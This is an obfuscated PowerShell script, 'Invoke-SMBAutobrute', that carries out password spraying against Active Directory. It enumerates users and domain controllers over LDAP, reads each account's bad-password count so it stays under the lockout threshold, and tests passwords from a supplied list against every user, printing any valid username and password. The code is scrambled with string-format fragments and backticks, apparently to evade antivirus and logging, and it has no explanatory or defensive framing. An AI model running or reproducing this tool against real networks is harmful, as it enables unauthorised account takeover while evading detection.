${M`36b} = [TYPE]("{7}{3}{1}{9}{6}{5}{8}{4}{0}{2}" -F 'Ma','rECt','iN','em.Di','Es.actIVEDiRECtOry.dO','RvI','YSe','syST','C','Or')  ; ${dF`Mo}  = [tYPE]("{1}{0}"-F'RING','sT') ;  &("{0}{2}{1}" -f 'seT','Em','-it')  ("v"+"Ar"+"Iable:Mfk")  ( [tYpE]("{3}{2}{0}{1}{4}" -F'TeM','.Io','s','sY','.fILE')); ${1`TP} =  [tYPE]("{0}{2}{1}" -f'EnViRO','nT','Nme')  ; function InVOke-`sMBAutob`RU`Te
{

    [CmdletBinding()] Param(
        [Parameter(manDAtory = ${faL`se})]
        [String] ${U`sERL`IST},

        [parameter(mAnDAtORY = ${TR`Ue})]
        [String] ${PaSs`woR`Dli`sT},

        [parameter(MandAtOrY = ${t`RUe})]
        [String] ${lock`O`U`TT`hReshOLD},

        [parameter(MaNdATOry = ${FAL`sE})]
        [int] ${de`LaY},

        [parameter(MAndATORy = ${Fal`Se})]
        [Switch] ${shOwV`E`RBO`se},

        [parameter(MANdATory = ${F`AlSe})]
        [Switch] ${sT`OpON`SuCcesS}
    )

    Begin
    {
        &("{2}{1}{0}" -f 'trictMode','et-S','S') -Version 2

        Try {&("{0}{1}" -f'Add-Typ','e') -AssemblyName ("{4}{3}{5}{2}{0}{1}{6}" -f 'nagem','e','ervices.AccountMa','.Direct','System','oryS','nt')}
        Catch {&("{2}{3}{1}{0}" -f 'r','rro','W','rite-E') ${ER`Ror}[0].("{0}{2}{1}" -f'ToS','g','trin').Invoke() ('+') ${Er`ROR}[0]."iNvo`cATIoNi`N`Fo"."p`Osi`TIo`NMESsAGe"}

        Try {&("{1}{0}"-f'ype','Add-T') -AssemblyName ("{1}{4}{2}{0}{3}"-f'e','System.','oryS','rvices','Direct')}
        Catch {&("{1}{0}{2}"-f'e-E','Writ','rror') ${E`Rr`OR}[0].("{2}{1}{0}" -f 'ring','oSt','T').Invoke() ('+') ${er`Ror}[0]."iNVo`CATI`O`Ninfo"."po`Si`T`IOnMessa`GE"}

        function g`eT`-PDCE()
        {
            ${c`o`NTEXT} = &("{1}{2}{0}"-f't','new-ob','jec') ("{1}{2}{8}{5}{4}{3}{9}{6}{7}{0}" -f'.DirectoryContext','Sy','ste','r','ySe','or','iv','eDirectory','m.Direct','vices.Act')(("{1}{0}"-f'ain','Dom'),${enV:`Us`E`Rdn`sDomaiN})
            ${D`O`mAIn} =  (  &("{0}{1}" -f 'Ge','t-ItEM')  ("{2}{0}{1}" -f'a','RiAbLE:m36B','v') )."v`AlUE"::("{0}{1}" -f'GetDom','ain').Invoke(${conTe`XT})
            return ${D`omain}."pDcro`l`EownEr"
        }

        function Ge`T`-uSERLIST(${maX`B`ADpw`DcouNt})
        {
            ${uS`e`Rs} = &("{0}{2}{3}{1}" -f'New-O','t','bj','ec') ("{7}{4}{0}{6}{5}{2}{8}{1}{3}"-f's','Lis','a','t','em.Collection','r','.Ar','Syst','y')
            ${c`Ou`NtTouSE} = ${MaxBa`DP`w`DCoUnT} - 2 
            ${d`E} = &("{2}{0}{1}" -f 'w-O','bject','Ne') ("{6}{0}{7}{3}{4}{1}{2}{5}"-f'tem.Di','ices.Director','y','rySer','v','Entry','Sys','recto') "LDAP://$pdc"
            ${S`EARCH} = &("{0}{2}{1}"-f'New-Ob','ct','je') ("{0}{2}{3}{4}{10}{5}{8}{9}{6}{1}{7}" -f'System.Di','Searc','rec','t','oryServi','s.D','tory','her','i','rec','ce') ${dE}
            ${SE`Ar`ch}."FIL`TeR" = "(&(objectclass=user)(badPwdCount<=$counttouse)(!userAccountControl:1.2.840.113556.1.4.803:=2))" 
            ${Se`A`RCH}."PAgE`sI`ZE" = 10
            ${fOU`N`dU`sErs} = ${S`eARcH}.("{0}{1}" -f'Fin','dAll').Invoke()
            if (${fOuND`U`s`ErS} -ne ${n`UlL})
            {
                foreach (${u} in ${foUNDu`S`eRS})
                {
                    ${U`sE`Rs}."a`dD"([string]${u}."pRo`pErT`IEs"[("{2}{4}{1}{0}{3}" -f 'n','unt','sa','ame','macco')]) | &("{1}{2}{0}"-f'l','Out-','Nul')
                }
            }
            return ${U`sE`Rs}
        }

        function get`-DOMAiN`COntRo`LLerS
        {
            ${d`CS} = &("{1}{0}{2}"-f'ew-Objec','N','t') ("{8}{5}{4}{7}{6}{2}{1}{0}{3}"-f'.Array','ns','tio','List','l','em.Co','ec','l','Syst')
            ${f`i`lTer} = ((("{18}{17}{8}{10}{1}{0}{16}{11}{14}{4}{6}{9}{13}{3}{15}{12}{7}{2}{5}" -f'mputer)','co',')','35','un',')','tControl:1.2.',':=8192','j','8','ectclass=','userAc','6.1.4.803','40.11','co','5','(','&(ob','(')))
            ${D`e} = &("{3}{1}{2}{0}" -f 'ect','w-Ob','j','Ne') ("{3}{10}{1}{5}{4}{6}{8}{7}{11}{2}{9}{0}" -f'y','irecto','r','System','rvic','rySe','es.Di','t','rec','yEntr','.D','o') "LDAP://$pdc"
            ${sE`ARcH} = &("{2}{0}{3}{1}" -f'-','bject','New','O') ("{4}{5}{6}{7}{1}{0}{3}{2}" -f 'rySe','ecto','cher','ar','Syste','m.Directory','Service','s.Dir') ${d`e}
            ${seAr`Ch}."F`I`Lter" = ${FI`l`Ter}
            ${SEA`RCH}."prop`ertIEsTOl`O`AD".("{0}{1}" -f 'Ad','d').Invoke('CN') | &("{0}{1}"-f 'Ou','t-Null')
            ${rEsUL`TS} = ${Se`ArcH}.("{1}{0}" -f 'ndAll','Fi').Invoke()
            foreach (${i`TEm} in ${Re`S`Ults})
            {
                ${d`cS}."A`dd"(${I`TeM}."P`RoP`ERTies"['cn']) | &("{1}{0}" -f'ut-Null','O')
            }
            ${SE`A`Rch} = ${nU`ll}
            ${dE}.("{0}{1}" -f'Dispo','se').Invoke()
            return ${d`cS}
        }

        function g`eT`-dcB`ADPwDCoUnT(${uSE`RiD}, ${D`c})
        {
            ${COu`NT} = -1
            ${DE} = &("{2}{0}{1}"-f'w-','Object','Ne') ("{7}{9}{1}{6}{0}{3}{2}{8}{5}{4}{10}"-f'toryServi','tem.D','D','ces.','yEn','ctor','irec','Sy','ire','s','try') "LDAP://$dc"
            ${S`E`ArcH} = &("{2}{0}{1}" -f '-Objec','t','New') ("{3}{8}{5}{7}{6}{1}{2}{0}{4}{9}"-f'irecto','ces.','D','Syst','ry','m.Directory','i','Serv','e','Searcher') ${d`e}
            ${sEa`RCh}."f`ILTeR" = "(&(objectclass=user)(samaccountname=$userid))"
            ${SEa`R`ch}."pR`O`pertie`sT`olo`AD".("{0}{1}" -f'Ad','d').Invoke(("{3}{1}{2}{0}" -f 'ount','d','PwdC','ba')) | &("{1}{0}"-f'l','Out-Nul')
            ${u`SER} = ${s`eAR`ch}.("{0}{2}{1}"-f 'Fin','ne','dO').Invoke()
            if (${U`sER} -ne ${n`Ull})
            {
                ${cOU`NT} = ${Us`er}."P`RoPeRT`ies"[("{0}{2}{1}"-f'ba','wdcount','dp')]
            }
            ${S`e`ARch} = ${NU`LL}
            ${De}.("{0}{1}"-f'Di','spose').Invoke()
            return ${CO`U`NT}
        }

        function ge`T-US`eRBAdPwdc`OUnT(${u`s`eriD}, ${D`CS})
        {
            
            
            ${t`o`TaLBADC`ounT} = -1
            foreach (${D`c} in ${D`Cs})
            {
                ${B`Ad`c`OUNT} = &("{0}{3}{1}{2}"-f'Get','BadPw','dCount','-DC') ${Use`Rid} ${D`C}
                if (${Bad`C`O`UNt} -gt ${toTAl`BaD`Co`UNT})
                {
                    ${To`TAL`BAD`coU`NT} = ${B`Adco`Unt}
                }
            }
            return ${tOtA`Lb`ADC`OU`Nt}
        }
    }

    Process
    {
        ${va`LIDacC`O`UnTs} = @{}

        ${u`seR`S`TOtest} = ${N`ULl}
        ('[*]'+' '+'Per'+'f'+'o'+'rming '+'pre'+'re'+'q '+"checks.`n")
        if (  (  &("{2}{1}{0}" -f 'Le','RIAb','va')  ('df'+'mO')  -ValUEONl  )::("{2}{3}{1}{0}"-f 'y','OrEmpt','IsNu','ll').Invoke(${us`ERL`ist}) -eq ${fa`L`se})
        {
            if ( ${m`FK}::("{1}{0}" -f'ts','Exis').Invoke(${u`se`RlISt}) -eq ${f`A`LsE})
            {
                ('['+'!] '+"$UserList "+'n'+'ot '+'found'+'. '+"Aborting.`n")
                exit
            }
            else
            {
                ${U`SErsTO`TE`sT} = &("{3}{2}{0}{1}"-f'nte','nt','Co','Get-') ${usEr`L`ISt}
            }
        }

        ${p`dc} = &("{2}{1}{0}"-f'e','et-PDC','G')

        if (${p`Dc} -eq ${nu`lL})
        {
            ('['+'!] '+'Cou'+'ld '+'n'+'ot '+'loca'+'t'+'e '+'do'+'main'+' '+'co'+'ntrol'+'ler.'+' '+"Aborting.`n")
            exit
        }

        ('[*]'+' '+'PDC'+': '+"$pdc`n")
        ('['+'*] '+'Pa'+'ssw'+'or'+'ds '+'to'+' '+'te'+'st: '+"$PasswordList`n")

        ${d`Cs} = &("{6}{5}{1}{4}{2}{0}{3}" -f'r','mainCont','lle','s','ro','et-Do','G')
        ${coNt`eXT`TY`PE} = [System.DirectoryServices.AccountManagement.ContextType]::"d`Om`AIN"
        ${PRiN`Ci`PA`Lcon`TeXT} = &("{0}{1}{2}"-f'New','-Ob','ject') ("{6}{8}{2}{9}{7}{1}{0}{10}{11}{5}{3}{12}{4}" -f'nt','ccou','.D','n','cipalContext','eme','S','s.A','ystem','irectoryService','Ma','nag','t.Prin')(${co`NteXT`TYpe}, ${p`DC})

        ${pW`dS} = &("{1}{0}{2}" -f 'w-Obj','Ne','ect') ("{7}{2}{4}{0}{1}{3}{5}{6}"-f '.Colle','ction','y','s','stem','.','ArrayList','S')
        foreach (${p`Wd} in ${Pas`SwO`R`d`LIst}.("{1}{0}" -f't','Spli').Invoke(','))
        {
            ${p`wds}.("{0}{1}"-f 'Ad','d').Invoke(${p`wd}.("{0}{1}" -f'T','rim').Invoke(' ')) | &("{1}{0}{2}" -f 'u','Out-N','ll')
        }

        ('['+'*] '+'I'+'nitiat'+'ing '+'bru'+'te.'+' '+'Unle'+'s'+'s '+'-ShowV'+'erbos'+'e'+' '+'w'+'as '+'specif'+'ied'+', '+'only'+' '+'s'+'ucces'+'ses '+'wil'+'l '+"show...`n")
        foreach (${p} in ${P`WdS})
        {
            if (${UseRStO`Te`st} -eq ${nU`Ll})
            {
                ${usE`R`sTo`TESt} = &("{1}{3}{2}{0}"-f 'st','Ge','serLi','t-U') ${loC`kOUt`T`hReshold}
            }

            foreach (${U} in ${U`sERst`ote`sT})
            {
                ${uS`eRid} = ${u}.("{0}{1}" -f'Tri','m').Invoke(' ').("{1}{0}"-f 'm','Tri').Invoke( ${1`Tp}::"nE`WLIne")
                if (${V`A`LID`AcCOun`Ts}.("{1}{3}{0}{2}"-f'ai','C','nsKey','ont').Invoke(${U`SErId}) -eq ${fa`LsE})
                {
                    ${A`TTEmp`Ts} = &("{0}{2}{1}{3}"-f 'Get-U','BadPw','ser','dCount') ${usE`RId} ${D`cS}
                    if (${aTteMp`TS} -ne -1 -and ${a`T`Te`MptS} -lt (${L`o`Ck`ou`TtHreS`hold} - 1))
                    {
                        ${iSv`A`lid} = ${FAl`Se}
                        ${I`SV`AlId} = ${p`RI`NC`IPa`LConTEXt}.("{2}{3}{0}{1}"-f'de','ntials','Valida','teCre').Invoke(${Us`Er`Id}, ${p}).("{2}{1}{0}" -f'ing','tr','ToS').Invoke()

                        if (${I`SVA`LiD} -eq ${tr`Ue})
                        {
                            ('[+'+'] '+'Su'+'ccess'+'! '+'U'+'ser'+'name'+': '+"$userid. "+'Pas'+'sw'+'ord: '+"$p`n")
                            ${VAliDAccO`Un`Ts}.("{1}{0}" -f'd','Ad').Invoke(${usE`RiD}, ${P})
                            if (${st`OPOnsUCcE`Ss}."I`spRESEnt")
                            {
								('[*'+'] '+'St'+'opO'+'n'+'S'+'uccess. '+"Exit.`n")
                                exit
                            }
                        }
                        else
                        {
                            if (${sHO`WVe`Rb`oSE}."i`s`PrEseNt")
                            {
                                ("[-] Failed. Username: $userid. Password: $p. BadPwdCount: $($attempts + 1)`n ")
                            }
                        }

                        if (${de`L`AY})
                        {
                            &("{2}{1}{3}{0}"-f 'ep','S','Start-','le') -m ${D`ElAy}
                        }
                        else
                        {
                            &("{2}{1}{3}{0}"-f'ep','l','Start-S','e') -m 100
                        }
                    }
                    else
                    {
                        if (${S`hoWvER`B`ose}."i`SPr`eSEnt")
                        {
                            ('[-'+'] '+'S'+'kipp'+'ed. '+'U'+'sername'+':'+' '+"$userid. "+'Passwo'+'rd:'+' '+"$p. "+'BadPwdC'+'o'+'u'+'nt: '+"$attempts`n")
                        }
                    }
                }
            }
        }
        ('[*'+'] '+"Completed.`n")
    }
}